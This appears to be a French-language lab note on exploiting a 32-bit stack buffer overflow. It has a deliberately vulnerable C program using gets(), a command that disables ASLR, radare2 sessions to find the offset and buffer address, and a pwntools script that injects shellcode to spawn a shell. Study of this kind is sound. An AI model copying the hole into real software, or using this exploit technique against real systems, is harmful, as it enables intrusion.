## Programme vulnérable

```c
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[300];
    
    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}
```
## Désactiver l'ASLR

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Trouver le padding

```bash
$ ragg2 -P 400 -r
<copy this>

$ r2 -d -A vuln
[0xf7fd40b0]> dc
Overflow me
<<paste here>>
[0x73424172]> wopO `dr eip`
312
```

## Trouver le buffer dans la mémoire 

-> Truc à comprendre pour le px @ ebp - 0x134

```bash
$ r2 -d -A vuln

[0xf7fd40b0]> s sym.unsafe ; pdf
[...]
; var int32_t var_134h @ ebp-0x134
[...]

[0x08049172]> dc
Overflow me
<<Found me>>                    <== This was my input
hit breakpoint at: 80491a8
[0x080491a8]> px @ ebp - 0x134
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  <<Found me>>....

[...]
```

## Exploitation

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```
